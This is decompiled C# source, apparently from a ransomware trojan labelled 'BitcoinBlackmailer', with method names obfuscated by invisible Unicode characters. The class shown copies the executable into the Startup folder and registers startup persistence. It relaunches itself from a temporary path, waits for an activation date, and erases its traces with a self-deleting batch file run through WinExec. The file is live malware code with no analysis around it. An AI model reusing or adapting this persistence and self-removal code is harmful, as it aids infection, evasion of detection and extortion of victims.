// Decompiled with JetBrains decompiler
// Type: Main.Tools.Hacking
// Assembly: BitcoinBlackmailer, Version=4.2.6.0, Culture=neutral, PublicKeyToken=null
// MVID: AC84B79B-C968-45A3-8FB8-BD1F97D1C9EF
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-7934625ee2b46883d287d31cb3d1d0b2eb3a0ac2a59a22d434b16513af3d1b11.exe

using Main.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Main.Tools
{
  internal static class Hacking
  {
    internal static void InitSoftware(Config.StartModeType startMode, string arg)
    {
      if (startMode == Config.StartModeType.Debug)
      {
        int num1 = (int) Hacking.\u202C⁪‪⁬‮​‌‎‪‪​‮‬‫‎⁪‌‬⁬‍​‫‏‌⁯‌‏‭⁬⁪‌⁭⁭⁭‍‍‌‫‭‮(Resources.StartModeDebug);
      }
      else if (arg != null)
      {
        if (startMode == Config.StartModeType.DeleteItself)
        {
          arg = Hacking.\u206F‮⁯‏‬⁬‮‍‮⁬‌⁮⁮‬‍⁮‎‎‭‏⁬⁭⁪‍⁯‌‫‪‭⁪​‏‭​‎⁭​⁫​‏‮(arg, "?", " ");
          if (Hacking.\u200C⁮‬​‭‌​‮‫‏⁯‫‭‬⁯‏‍⁫‫⁯‏‭‭‍⁭‏‮‮‏‭‍⁯‪⁫⁪⁫⁮​‎⁯‮(arg) && Hacking.\u206F‮⁮‭⁬‪‏‏⁪‏​‌⁪‫‪‍⁭‫‏‍‏‏‌⁮‍‬⁮‏⁯⁬‍⁬⁬‮‌‍‬⁫‎‮(arg))
          {
            int num2 = 0;
            bool flag;
            do
            {
              string str = Hacking.\u200D‎‏⁪‎‫‍‪⁪‏‫⁭⁪‬‬⁪​⁬‬‎​‮⁪⁬⁪‏⁪‌‍‫⁬⁫‬​⁪⁮‪‮‮‎‮(arg);
              string exeFolderPath = Hacking.\u202E⁮⁭⁬‮⁮‭‍‫‮‬​‍‫‫⁫‪‎‮‪⁭‪​‍‌‭⁯‍‬‮‌‍⁮⁬‏‬‭‮⁪⁭‮((object) Hacking.\u206D‭⁭⁬⁮‌‫‬⁫⁮⁯‪‪‍⁬⁪⁮‬⁮‫⁯‭⁭‫⁯⁬⁯⁭⁯‍​‬‎⁮⁯‪‎‌⁫‭‮(arg));
              // ISSUE: reference to a compiler-generated method
              // ISSUE: reference to a compiler-generated method
              // ISSUE: reference to a compiler-generated method
              flag = ((IEnumerable<Process>) Hacking.\u200D⁯‎⁫​⁫‏⁯⁫‫‬‪⁯‭​‎⁬⁪​‎‏‏⁮‏‬‏⁪‌‫‌‭‏‎‬‪‮‍‬‮‏‮(str)).FirstOrDefault<Process>((Func<Process, bool>) (p => Hacking.\u003C\u003Ec__DisplayClass0_0.\u200E‬⁪‭‎​‪‬⁯⁬‎‍‍⁬‭⁯‍​‭​⁫‌⁪‮‬​⁯⁮⁬⁬⁮‮⁯‫‬‍‭⁯⁮⁫‮(Hacking.\u003C\u003Ec__DisplayClass0_0.\u200F⁭⁭⁮⁫⁫‪⁬⁭⁮‫⁪⁭‫‬​‫‫⁮⁭‮‍‏‏‍⁫‌⁭⁬‮‭​‬‏‬⁪‪‮‍‏‮(Hacking.\u003C\u003Ec__DisplayClass0_0.\u200C⁮‫⁫⁫‫⁯⁭‏‏‪⁮⁫‮⁬‎​⁯​⁬⁭⁪‮⁬‍⁮⁬⁪‭‮‍​⁮⁯‭⁯⁪⁭‍⁯‮(p)), exeFolderPath))) != null;
              Hacking.\u200F‬⁬⁫‍‮⁯‮‏⁫‎⁭⁯‌‬⁭⁯‪⁫⁫⁪⁫⁭‏‫⁪‌⁪⁬‏‍⁮⁫‭‎⁫⁮‪‍⁪‮(100);
              ++num2;
            }
            while (flag && num2 < 100);
            Hacking.\u200F‬⁬⁫‍‮⁯‮‏⁫‎⁭⁯‌‬⁭⁯‪⁫⁫⁪⁫⁭‏‫⁪‌⁪⁬‏‍⁮⁫‭‎⁫⁮‪‍⁪‮(300);
            if (!flag)
              Hacking.\u206E​⁮‬‮⁯⁭⁫‫⁬⁯⁫⁫⁯⁯⁬‌‍⁫⁬‎⁫⁯‪‪⁯‬‏⁮⁮‬⁬‎‪⁪‏⁪⁫‮‌‮(arg);
          }
        }
        if (startMode == Config.StartModeType.ErrorMessage)
        {
          int num3 = (int) Hacking.\u202D⁮⁯‭‌​‮⁫⁮‎⁮‏⁫⁬‏‬‭‬⁭⁪⁪‌⁮⁪​⁫⁯‍‭‮‪‌‮⁪‭⁭‬‮‬‬‮(Config.ErrorMessage, Config.ErrorTitle, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        if (!Config.OnlyRunAfterSysRestart)
          return;
        Hacking.\u200B​‏⁭​‬​⁬‎‌‭‪‌‮⁮⁭‍⁬​‮‬‬⁬⁯‭‫‮‪‎‎‫⁬‍‍‭⁬⁮⁮‌‪‮(0);
      }
      else
      {
        string tempExePath = Config.TempExePath;
        if (Config.FinalExeRelativePath != null)
        {
          string str = Hacking.\u202D‪‫‌‮‭⁫⁬⁬⁪⁭‬⁫‪⁯⁬‎⁭‎‭⁪⁮⁬‬​⁭⁯‍⁭‏⁮‏‍‏‍⁫‌⁯​⁮‮(Hacking.\u206D‍‭​⁬‮⁫‮​‭⁪⁭‮‍‪‌‎‮‌‏‬⁮⁭⁮⁯‍⁮‫‫‏‎‍‌​‮‫⁭⁯‮⁪‮(Environment.SpecialFolder.Startup), Hacking.\u200C​​⁮‫‮‪‎‌‎⁭⁭⁫‬‏‭⁪‏⁪⁫‍‍‍⁯​‫‭‫‭⁭⁮⁬⁭‏‏⁭‫⁪‪‬‮(Config.FinalExeRelativePath));
          Main.Tools.Windows.SetStartup(Config.StartupMethod);
          if (Hacking.\u200B‍‏⁮‫‏‫‌⁬​⁬‮⁭‪⁮⁫‮⁮‮⁪‪⁯⁫⁭⁯⁫⁮⁮⁮‬⁮‏‏⁯​‍⁪‌⁪‮(Hacking.\u200D⁫⁮‎‬‬⁫‪⁮‌‌‭‪⁭⁬‏​⁬⁪⁬⁭⁭‫‎⁮⁬‮‬‬​⁬‬‫⁬‎⁮‎​⁭‍‮(), Config.FinalExePath) || Hacking.\u200B‍‏⁮‫‏‫‌⁬​⁬‮⁭‪⁮⁫‮⁮‮⁪‪⁯⁫⁭⁯⁫⁮⁮⁮‬⁮‏‏⁯​‍⁪‌⁪‮(Hacking.\u200D⁫⁮‎‬‬⁫‪⁮‌‌‭‪⁭⁬‏​⁬⁪⁬⁭⁭‫‎⁮⁬‮‬‬​⁬‬‫⁬‎⁮‎​⁭‍‮(), str))
            return;
        }
        if (Hacking.ExeSmartCopy(Config.FinalExePath, true))
          Hacking.ExeSmartCopy(tempExePath, true);
        string str1 = Hacking.\u206F‮⁯‏‬⁬‮‍‮⁬‌⁮⁮‬‍⁮‎‎‭‏⁬⁭⁪‍⁯‌‫‪‭⁪​‏‭​‎⁭​⁫​‏‮(Hacking.\u200D⁫⁮‎‬‬⁫‪⁮‌‌‭‪⁭⁬‏​⁬⁪⁬⁭⁭‫‎⁮⁬‮‬‬​⁬‬‫⁬‎⁮‎​⁭‍‮(), " ", "?");
        Hacking.\u206B‍‮⁫‪‍⁬⁫⁬‭‫⁭⁮‎⁬‪⁪‎‫‏​‌‫⁬⁫‭⁪​‌‍‎‭‭‪‍⁬‏⁯‎⁮‮(tempExePath, str1);
        Hacking.\u200B​‏⁭​‬​⁬‎‌‭‪‌‮⁮⁭‍⁬​‮‬‬⁬⁯‭‫‮‪‎‎‫⁬‍‍‭⁬⁮⁮‌‪‮(0);
      }
    }

    internal static bool ExeSmartCopy(string targetExePath, bool overwrite)
    {
      if (Hacking.\u200B‍‏⁮‫‏‫‌⁬​⁬‮⁭‪⁮⁫‮⁮‮⁪‪⁯⁫⁭⁯⁫⁮⁮⁮‬⁮‏‏⁯​‍⁪‌⁪‮(Hacking.\u200D⁫⁮‎‬‬⁫‪⁮‌‌‭‪⁭⁬‏​⁬⁪⁬⁭⁭‫‎⁮⁬‮‬‬​⁬‬‫⁬‎⁮‎​⁭‍‮(), targetExePath))
        return false;
      Hacking.\u202E⁬‬⁬‭‭‌‌‫‫⁭‏‮⁫⁫‭​‏‏‫​‏⁯‮‮⁪⁭⁯⁭‫⁭⁯⁪‎​‬‌‏⁮⁭‮(Hacking.\u202E⁮⁭⁬‮⁮‭‍‫‮‬​‍‫‫⁫‪‎‮‪⁭‪​‍‌‭⁯‍‬‮‌‍⁮⁬‏‬‭‮⁪⁭‮((object) Hacking.\u206D‭⁭⁬⁮‌‫‬⁫⁮⁯‪‪‍⁬⁪⁮‬⁮‫⁯‭⁭‫⁯⁬⁯⁭⁯‍​‬‎⁮⁯‪‎‌⁫‭‮(targetExePath)));
      Hacking.\u206B‏​​‪​⁭⁮‫⁪‪‍‪⁮‭‍‬‏‏‮⁯⁯⁯⁯⁯‎‏​‫​⁪‫‬‭‮⁪​‏‫‫‮(Hacking.\u200D⁫⁮‎‬‬⁫‪⁮‌‌‭‪⁭⁬‏​⁬⁪⁬⁭⁭‫‎⁮⁬‮‬‬​⁬‬‫⁬‎⁮‎​⁭‍‮(), targetExePath, overwrite);
      return true;
    }

    internal static bool ShouldActivate() => DateTime.Now > Config.ActiveAfterDateTime;

    internal static void RemoveItself()
    {
      if (Config.StartMode == Config.StartModeType.Debug)
        Hacking.\u200B​‏⁭​‬​⁬‎‌‭‪‌‮⁮⁭‍⁬​‮‬‬⁬⁯‭‫‮‪‎‎‫⁬‍‍‭⁬⁮⁮‌‪‮(0);
      try
      {
        Main.Tools.Windows.RemoveStartupRegistry(Config.FinalExePath);
        foreach (string str in new HashSet<string>()
        {
          Hacking.\u200B⁭‌⁯‫‏‏‍‬⁮⁬⁪​‎⁪‭‏​‬⁭⁪⁭⁫‬‍‬‎⁬⁫‏‫‫⁪‌‭‬⁫⁯⁮⁫‮(Config.FinalExePath),
          Hacking.\u200B⁭‌⁯‫‏‏‍‬⁮⁬⁪​‎⁪‭‏​‬⁭⁪⁭⁫‬‍‬‎⁬⁫‏‫‫⁪‌‭‬⁫⁯⁮⁫‮(Config.TempExePath),
          Config.WorkFolderPath
        })
        {
          try
          {
            if (Hacking.\u206B⁯‏‍⁬‮​‬‫⁬‎‍​‭‏‌‪‎⁬⁫⁭‪​​‏‎​‬⁪‌‫⁬‍‬‫‫‎⁪‎‏‮(str))
              Hacking.\u200E‫‫⁬‬⁫⁫‬⁮⁮‪⁯⁬⁯‪‪​⁫‎⁪‌⁫‬⁮⁪⁬‫⁬⁬‎⁯‬⁪‎‏​⁬⁯⁭‎‮(str, true);
          }
          catch (Exception ex)
          {
          }
        }
        string lpCmdLine = Hacking.\u206F‏⁬‍‫‎‌⁬‬‎‬‮⁫‎⁯⁬⁭⁯‏‪‪‫⁭​⁬‬‌‪‏⁫⁪⁬‫⁫‏‎⁬‏⁮‍‮(Hacking.\u200B⁭‌⁯‫‏‏‍‬⁮⁬⁪​‎⁪‭‏​‬⁭⁪⁭⁫‬‍‬‎⁬⁫‏‫‫⁪‌‭‬⁫⁯⁮⁫‮(Hacking.\u200D⁫⁮‎‬‬⁫‪⁮‌‌‭‪⁭⁬‏​⁬⁪⁬⁭⁭‫‎⁮⁬‮‬‬​⁬‬‫⁬‎⁮‎​⁭‍‮()), "\\DeleteItself.bat");
        StreamWriter streamWriter = Hacking.\u202A‏‏‏‫‮‌‫⁫‬⁮​‮⁭‍‭⁮‍⁮‏⁭⁭⁯‌⁭⁯‎⁬⁭⁭⁮‮‫‪‌⁯⁬⁪⁮⁭‮(lpCmdLine, false, Hacking.\u202D‪‮‭‌‭‮​‌⁬⁮‮⁬‏‭‌⁪‍‭⁯‌​⁯‌⁫⁬‎⁪‎‬‪‪⁭‍​‌⁪⁮⁮‎‮());
        try
        {
          Hacking.\u200B⁯⁮‎‍⁭‌‭‏‬‎‬‌⁯‪⁪‫‫‏‌⁭⁪⁯⁫‌‍‪‬⁭⁪⁯⁪‏⁬‭⁫⁮‌‏‌‮((TextWriter) streamWriter, ":del\r\n del \"{0}\"\r\nif exist \"{0}\" goto del\r\ndel %0\r\n", (object) Hacking.\u200D⁫⁮‎‬‬⁫‪⁮‌‌‭‪⁭⁬‏​⁬⁪⁬⁭⁭‫‎⁮⁬‮‬‬​⁬‬‫⁬‎⁮‎​⁭‍‮());
        }
        finally
        {
          if (streamWriter != null)
            Hacking.\u200E⁪‬‪⁮‏⁪‌‏‎⁮‭⁮⁪⁪‏‬‎⁭‪‭‫‏⁮⁫‭‬‏‫‮‍⁪‌⁮⁬‎‎​‍‎‮((IDisposable) streamWriter);
        }
        int num = (int) Hacking.WinExec(lpCmdLine, 0U);
      }
      catch
      {
      }
      finally
      {
        try
        {
          Hacking.\u200B​‏⁭​‬​⁬‎‌‭‪‌‮⁮⁭‍⁬​‮‬‬⁬⁯‭‫‮‪‎‎‫⁬‍‍‭⁬⁮⁮‌‪‮(0);
        }
        catch
        {
          Hacking.\u202A‪⁬‎‎‎‌‬‍‏‮‍‭‏⁫‫‫‭⁭‮‭‮‍⁬‮‪‌⁪‎‬⁯⁯⁯‫‍‌⁬‫‌‎‮();
        }
      }
    }

    [DllImport("kernel32.dll")]
    public static extern uint WinExec(string lpCmdLine, uint uCmdShow);

    static DialogResult \u202C⁪‪⁬‮​‌‎‪‪​‮‬‫‎⁪‌‬⁬‍​‫‏‌⁯‌‏‭⁬⁪‌⁭⁭⁭‍‍‌‫‭‮([In] string obj0) => MessageBox.Show(obj0);

    static string \u206F‮⁯‏‬⁬‮‍‮⁬‌⁮⁮‬‍⁮‎‎‭‏⁬⁭⁪‍⁯‌‫‪‭⁪​‏‭​‎⁭​⁫​‏‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0.Replace(obj1, obj2);
    }

    static bool \u200C⁮‬​‭‌​‮‫‏⁯‫‭‬⁯‏‍⁫‫⁯‏‭‭‍⁭‏‮‮‏‭‍⁯‪⁫⁪⁫⁮​‎⁯‮([In] string obj0) => Path.IsPathRooted(obj0);

    static bool \u206F‮⁮‭⁬‪‏‏⁪‏​‌⁪‫‪‍⁭‫‏‍‏‏‌⁮‍‬⁮‏⁯⁬‍⁬⁬‮‌‍‬⁫‎‮([In] string obj0) => File.Exists(obj0);

    static string \u200D‎‏⁪‎‫‍‪⁪‏‫⁭⁪‬‬⁪​⁬‬‎​‮⁪⁬⁪‏⁪‌‍‫⁬⁫‬​⁪⁮‪‮‮‎‮([In] string obj0) => Path.GetFileNameWithoutExtension(obj0);

    static DirectoryInfo \u206D‭⁭⁬⁮‌‫‬⁫⁮⁯‪‪‍⁬⁪⁮‬⁮‫⁯‭⁭‫⁯⁬⁯⁭⁯‍​‬‎⁮⁯‪‎‌⁫‭‮([In] string obj0) => Directory.GetParent(obj0);

    static string \u202E⁮⁭⁬‮⁮‭‍‫‮‬​‍‫‫⁫‪‎‮‪⁭‪​‍‌‭⁯‍‬‮‌‍⁮⁬‏‬‭‮⁪⁭‮([In] object obj0) => obj0.ToString();

    static Process[] \u200D⁯‎⁫​⁫‏⁯⁫‫‬‪⁯‭​‎⁬⁪​‎‏‏⁮‏‬‏⁪‌‫‌‭‏‎‬‪‮‍‬‮‏‮([In] string obj0) => Process.GetProcessesByName(obj0);

    static void \u200F‬⁬⁫‍‮⁯‮‏⁫‎⁭⁯‌‬⁭⁯‪⁫⁫⁪⁫⁭‏‫⁪‌⁪⁬‏‍⁮⁫‭‎⁫⁮‪‍⁪‮([In] int obj0) => Thread.Sleep(obj0);

    static void \u206E​⁮‬‮⁯⁭⁫‫⁬⁯⁫⁫⁯⁯⁬‌‍⁫⁬‎⁫⁯‪‪⁯‬‏⁮⁮‬⁬‎‪⁪‏⁪⁫‮‌‮([In] string obj0) => File.Delete(obj0);

    static DialogResult \u202D⁮⁯‭‌​‮⁫⁮‎⁮‏⁫⁬‏‬‭‬⁭⁪⁪‌⁮⁪​⁫⁯‍‭‮‪‌‮⁪‭⁭‬‮‬‬‮(
      [In] string obj0,
      [In] string obj1,
      [In] MessageBoxButtons obj2,
      [In] MessageBoxIcon obj3)
    {
      return MessageBox.Show(obj0, obj1, obj2, obj3);
    }

    static void \u200B​‏⁭​‬​⁬‎‌‭‪‌‮⁮⁭‍⁬​‮‬‬⁬⁯‭‫‮‪‎‎‫⁬‍‍‭⁬⁮⁮‌‪‮([In] int obj0) => Environment.Exit(obj0);

    static string \u206D‍‭​⁬‮⁫‮​‭⁪⁭‮‍‪‌‎‮‌‏‬⁮⁭⁮⁯‍⁮‫‫‏‎‍‌​‮‫⁭⁯‮⁪‮([In] Environment.SpecialFolder obj0) => Environment.GetFolderPath(obj0);

    static string \u200C​​⁮‫‮‪‎‌‎⁭⁭⁫‬‏‭⁪‏⁪⁫‍‍‍⁯​‫‭‫‭⁭⁮⁬⁭‏‏⁭‫⁪‪‬‮([In] string obj0) => Path.GetFileName(obj0);

    static string \u202D‪‫‌‮‭⁫⁬⁬⁪⁭‬⁫‪⁯⁬‎⁭‎‭⁪⁮⁬‬​⁭⁯‍⁭‏⁮‏‍‏‍⁫‌⁯​⁮‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static string \u200D⁫⁮‎‬‬⁫‪⁮‌‌‭‪⁭⁬‏​⁬⁪⁬⁭⁭‫‎⁮⁬‮‬‬​⁬‬‫⁬‎⁮‎​⁭‍‮() => Application.ExecutablePath;

    static bool \u200B‍‏⁮‫‏‫‌⁬​⁬‮⁭‪⁮⁫‮⁮‮⁪‪⁯⁫⁭⁯⁫⁮⁮⁮‬⁮‏‏⁯​‍⁪‌⁪‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static Process \u206B‍‮⁫‪‍⁬⁫⁬‭‫⁭⁮‎⁬‪⁪‎‫‏​‌‫⁬⁫‭⁪​‌‍‎‭‭‪‍⁬‏⁯‎⁮‮([In] string obj0, [In] string obj1) => Process.Start(obj0, obj1);

    static DirectoryInfo \u202E⁬‬⁬‭‭‌‌‫‫⁭‏‮⁫⁫‭​‏‏‫​‏⁯‮‮⁪⁭⁯⁭‫⁭⁯⁪‎​‬‌‏⁮⁭‮([In] string obj0) => Directory.CreateDirectory(obj0);

    static void \u206B‏​​‪​⁭⁮‫⁪‪‍‪⁮‭‍‬‏‏‮⁯⁯⁯⁯⁯‎‏​‫​⁪‫‬‭‮⁪​‏‫‫‮([In] string obj0, [In] string obj1, [In] bool obj2) => File.Copy(obj0, obj1, obj2);

    static string \u200B⁭‌⁯‫‏‏‍‬⁮⁬⁪​‎⁪‭‏​‬⁭⁪⁭⁫‬‍‬‎⁬⁫‏‫‫⁪‌‭‬⁫⁯⁮⁫‮([In] string obj0) => Path.GetDirectoryName(obj0);

    static bool \u206B⁯‏‍⁬‮​‬‫⁬‎‍​‭‏‌‪‎⁬⁫⁭‪​​‏‎​‬⁪‌‫⁬‍‬‫‫‎⁪‎‏‮([In] string obj0) => Directory.Exists(obj0);

    static void \u200E‫‫⁬‬⁫⁫‬⁮⁮‪⁯⁬⁯‪‪​⁫‎⁪‌⁫‬⁮⁪⁬‫⁬⁬‎⁯‬⁪‎‏​⁬⁯⁭‎‮([In] string obj0, [In] bool obj1) => Directory.Delete(obj0, obj1);

    static string \u206F‏⁬‍‫‎‌⁬‬‎‬‮⁫‎⁯⁬⁭⁯‏‪‪‫⁭​⁬‬‌‪‏⁫⁪⁬‫⁫‏‎⁬‏⁮‍‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static Encoding \u202D‪‮‭‌‭‮​‌⁬⁮‮⁬‏‭‌⁪‍‭⁯‌​⁯‌⁫⁬‎⁪‎‬‪‪⁭‍​‌⁪⁮⁮‎‮() => Encoding.Default;

    static StreamWriter \u202A‏‏‏‫‮‌‫⁫‬⁮​‮⁭‍‭⁮‍⁮‏⁭⁭⁯‌⁭⁯‎⁬⁭⁭⁮‮‫‪‌⁯⁬⁪⁮⁭‮(
      [In] string obj0,
      [In] bool obj1,
      [In] Encoding obj2)
    {
      return new StreamWriter(obj0, obj1, obj2);
    }

    static void \u200B⁯⁮‎‍⁭‌‭‏‬‎‬‌⁯‪⁪‫‫‏‌⁭⁪⁯⁫‌‍‪‬⁭⁪⁯⁪‏⁬‭⁫⁮‌‏‌‮(
      [In] TextWriter obj0,
      [In] string obj1,
      [In] object obj2)
    {
      obj0.Write(obj1, obj2);
    }

    static void \u200E⁪‬‪⁮‏⁪‌‏‎⁮‭⁮⁪⁪‏‬‎⁭‪‭‫‏⁮⁫‭‬‏‫‮‍⁪‌⁮⁬‎‎​‍‎‮([In] IDisposable obj0) => obj0.Dispose();

    static void \u202A‪⁬‎‎‎‌‬‍‏‮‍‭‏⁫‫‫‭⁭‮‭‮‍⁬‮‪‌⁪‎‬⁯⁯⁯‫‍‌⁬‫‌‎‮() => Application.Exit();
  }
}
